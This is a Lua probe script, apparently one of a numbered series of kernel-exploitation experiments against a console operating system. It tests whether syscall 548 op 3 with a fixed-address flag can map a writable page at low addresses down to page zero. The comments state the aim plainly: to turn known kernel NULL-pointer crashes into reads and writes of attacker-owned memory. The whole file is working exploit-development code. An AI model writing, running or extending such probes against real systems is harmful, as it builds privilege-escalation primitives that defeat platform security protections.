-- CRASH_CLASS: LOW
-- PROBE 1510a: how LOW can 548 op 3 + MAP_FIXED place a page? (page zero?)
--
-- Context: 1508a proved op 3 with flags bit 0x10 maps at EXACTLY the requested
-- address, deleting whatever entry was there, with no ownership check -- it
-- landed on 0x31106C000, on a chosen hole at 0x311074000, and on the
-- SceGnmTrapCode device window at 0xF00000000.  1509b showed the protection is
-- forced into 0/1/2/3 (bit 0x4 is stripped), so the page is ordinary RW.
--
-- What nobody has asked is the FLOOR.  Every address tried so far was a normal
-- heap address from mmap.  If op 3 can place a page at 0x0, then every kernel
-- path that dereferences a NULL pointer read out of caller bytes stops being a
-- kill and starts being a read/write of memory we own.  Two measured killers
-- have exactly that shape: 601 cmd 0x11 dies on an ALL-ZERO caller page even
-- with arg1=NULL (1400a), and the 622 low command table dies on entry
-- (1346a/1347a/1348a).  Also 1480b reported op 0 at 0x10000 answering EBUSY,
-- which is an odd answer for an address that should simply be unmapped.
--
-- This probe only maps and reads back; nothing here executes or calls a killer.
--
-- prior art: results/phase36_realargs/1508a_sys548_map_fixed_20261109_224934.txt
--            results/phase36_realargs/1509b_sys548_op3_exec_20261109_225307.txt
--            results/phase36_realargs/1480b_sys548_low_map_20261109_200449.txt
--            results/phase36_realargs/1492a_sys548_map_ceiling_20261109_220558.txt

print("=== PROBE 1510a: 548 op3 MAP_FIXED LOW-ADDRESS LADDER ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local mk = {}
for _, n in ipairs({20, 477, 547, 548}) do mk[n] = make_syscall(n) end

local function u32(v)
    local n = tonumber(v) or 0
    if n < 0 then n = n + 4294967296 end
    return n % 4294967296
end
local function sgn(v)
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function call(sc, a1, a2, a3, a4, a5, a6)
    local ok, r = pcall(function() return sc(a1, a2, a3, a4, a5, a6) end)
    if ok then return r end
    return "EXC"
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return u32(to_num(v)) end
    return 0xDEADBEEF
end
local function wr(a, v)
    return pcall(function() memory.write_dword(a, uint64(v)) end)
end
print("[0] pid=" .. tonumber(to_num(mk[20]())))

local rec = memory.alloc(0x40)
local function prot_of(va)
    local i
    for i = 0, 0x3C, 4 do wr(rec + i, 0) end
    local rv = call(mk[547], uint64(va), uint64(rec), uint64(0), uint64(0), uint64(0), uint64(0))
    if sgn(rv) ~= 0 then return -1, 0, 0 end
    return rd(rec + 0x10), rd(rec + 0x00) + rd(rec + 0x04) * 4294967296,
           rd(rec + 0x08) + rd(rec + 0x0C) * 4294967296
end

local ent = memory.alloc(0x40)
local done = memory.alloc(8)
local function map_fixed(va, len, prot, flags)
    local i
    for i = 0, 0x3F, 4 do wr(ent + i, 0) end
    wr(ent + 0x00, va % 4294967296)
    wr(ent + 0x04, math.floor(va / 4294967296))
    wr(ent + 0x10, len % 4294967296)
    wr(ent + 0x14, math.floor(len / 4294967296))
    wr(ent + 0x18, prot)
    wr(ent + 0x1C, 3)
    wr(done, 0xEEEEEEEE)
    local rv = call(mk[548], uint64(0), uint64(flags), uint64(ent), uint64(1), uint64(done), uint64(0))
    return sgn(rv), rd(done)
end

-- ------------------------------------------------------------------
-- [A] where does the current map actually start?
-- ------------------------------------------------------------------
print("--- [A] baseline: what is already mapped down low ---")
local low = {0x0, 0x1000, 0x4000, 0x10000, 0x100000, 0x1000000}
for i, a in ipairs(low) do
    local p, s, e = prot_of(a)
    print(string.format("  547(0x%X) prot=%d start=0x%X end=0x%X", a, p, s, e))
end

-- ------------------------------------------------------------------
-- [B] op 3 MAP_FIXED at each rung, lowest first but skipping 0x0 until last
--     (a successful page-0 map could change how a later fault is reported)
-- ------------------------------------------------------------------
print("")
print("--- [B] op3 MAP_FIXED, 16 KiB each, flags 0x10, prot 3 ---")
local rungs = {0x4000, 0x10000, 0x100000, 0x1000000, 0x0}
local lowest = nil
for i, a in ipairs(rungs) do
    local p0 = prot_of(a)
    print(string.format("  [B%d] 0x%X (547 before: prot=%d)", i, a, p0))
    local rv, proc = map_fixed(a, 0x4000, 3, 0x10)
    print(string.format("       op3 rv=0x%X processed=%d %s",
        rv, proc, (rv == a) and "<<< LANDED AT THE REQUESTED ADDRESS" or ""))
    if rv == a then
        local p1 = prot_of(a)
        print(string.format("       547 after: prot=%d", p1))
        if p1 == 1 or p1 == 2 or p1 == 3 then
            wr(a, 0xC0DE0000 + i)
            local back = rd(a)
            print(string.format("       store/read 0x%08X -> 0x%08X %s",
                0xC0DE0000 + i, back, (back == 0xC0DE0000 + i) and "(writable)" or "(NOT writable)"))
        end
        if lowest == nil or a < lowest then lowest = a end
    end
end

-- ------------------------------------------------------------------
-- [C] plain mmap MAP_FIXED at 0x0, for comparison
-- ------------------------------------------------------------------
print("")
print("--- [C] plain mmap at 0x0 with MAP_FIXED (0x10) ---")
local m0 = sgn(call(mk[477], uint64(0), uint64(0x4000), uint64(3), uint64(0x1002 + 0x10), uint64(0xFFFFFFFF), uint64(0)))
print(string.format("  mmap(0x0, 0x4000, 3, MAP_ANON|MAP_FIXED) rv=0x%X %s",
    m0, (m0 == 0) and "<<< PAGE ZERO MAPPED" or ""))
local m1 = sgn(call(mk[477], uint64(0), uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)))
print(string.format("  mmap(NULL, 0x4000, 3, MAP_ANON) rv=0x%X", m1))

print("")
if lowest ~= nil and lowest == 0 then
    print("VERDICT: PAGE ZERO IS MAPPABLE through 548 op 3 -- every kernel NULL deref")
    print("         of a value read from caller bytes now lands in memory we own.")
elseif lowest ~= nil then
    print(string.format("VERDICT: lowest address op 3 would place a page is 0x%X; page zero refused.", lowest))
else
    print("VERDICT: no rung landed at the requested address.")
end
print("final canary pid=" .. tonumber(to_num(mk[20]())))
print("=== PROBE 1510a COMPLETE ===")
